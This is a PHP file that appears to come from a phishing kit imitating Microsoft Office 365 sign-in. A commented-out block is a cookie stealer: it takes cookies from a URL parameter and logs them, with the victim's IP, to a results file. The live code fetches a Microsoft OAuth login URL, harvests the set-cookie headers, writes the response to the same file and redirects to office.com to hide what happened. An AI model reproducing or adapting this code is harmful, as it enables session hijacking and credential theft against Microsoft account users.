<?php
// header("Location: https://office.com");
// function getUserIpAddr(){
//     if(!empty($_SERVER['HTTP_CLIENT_IP'])){
//         //ip from share internet
//         $ip = $_SERVER['HTTP_CLIENT_IP'];
//     }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
//         //ip pass from proxy
//         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
//     }else{
//         $ip = $_SERVER['REMOTE_ADDR'];
//     }
//     return $ip;
// }

// $cookie = $_GET['c'];
// $ip = getUserIpAddr();
// $steal="\n----Cookies----\nIP:$ip\n-----\n";
// $steal.="Cookie:$cookie\n\n\n-----\n\n";

// $file = fopen('../results/login.txt','a');
// fwrite($file, $steal);

?>
<?php

$get_cookie_page = 'https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=637616008868882324.NWM1ZmQwYmYtYzYzNC00MjBmLTg3OTctYmEzZTJkYjM4MGY3NTVhNDdkMGUtYTU2Mi00NTZmLThmMzQtNjVjYmRjNjcyMjVk&ui_locales=en-US&mkt=en-US&client-request-id=d624810f-0366-4472-a66b-38b14df9cfb5&domain_hint=live.com&prompt=select_account&state=baE_7vZ24A4NfVyYhGLo0tu6Fl4TGaX6KnL7TJ1eVb69WQUw0P4QhOxSVbVJ5jCJ89MDro4STAJIsx2rUkcOfJbXOgL0EQ1nngn6_miZDvQ1haG5lDOc8hILGRNEuwzRuvLRwEvU1L4iy57pFckArWj5r9ha884pem7Xc5UFqrLVcAir5hUWLJGybPL3v_N-dK0z3j_UjFMRL0I6Z9j6_Oy8shmr_b2MhaPukNdcUzOt95eI4qQHKwhF_Wp4m2s8UyHQoOYFS9jisXBKbPxwFzcEIfL8sNl-3G0dgFpQ1xI7BRVHtFudZagEog9Mauugon1BfUR5aiDz4_QLjFcP1n9NWb6JCIk8a7-0o1XAKQodLoK10hOa_H2791anfDPSxhkwxhbsWIKNRX-nfDN-3Q&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.8.0.0';
$arr = preg_split('/set-cookie: /i',curl_download($get_cookie_page));
$cookies = array();
foreach($arr as $cook){
  if(stripos( $cook,"path=")!==false)
    array_push($cookies, trim(explode("\n",$cook)[0]));
}
echo json_encode($cookies);
header("Location: https://office.com");
function curl_download($Url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $Url);
  curl_setopt($ch, CURLOPT_NOBODY, true);
  curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
  $input = $Url;
  $input = explode('/',preg_replace( "#^[^:/.]*[:/]+#i", "", $input ))[0];
  echo $input;
  $http_headers = array(
                    'Host: '.$input,
                    'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2',
                    'Accept: */*',
                    'Accept-Language: en-us,en;q=0.5',
                    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                    'Connection: keep-alive'
                  );
  curl_setopt($ch, CURLOPT_HEADER, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $http_headers);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  $output = curl_exec($ch);
  curl_close($ch);
  $myfile = fopen("../results/login.txt", "a") or die("Unable to open file!");
    fwrite($myfile, $output);
    fclose($myfile);
  // echo $output;
  return $output;

}
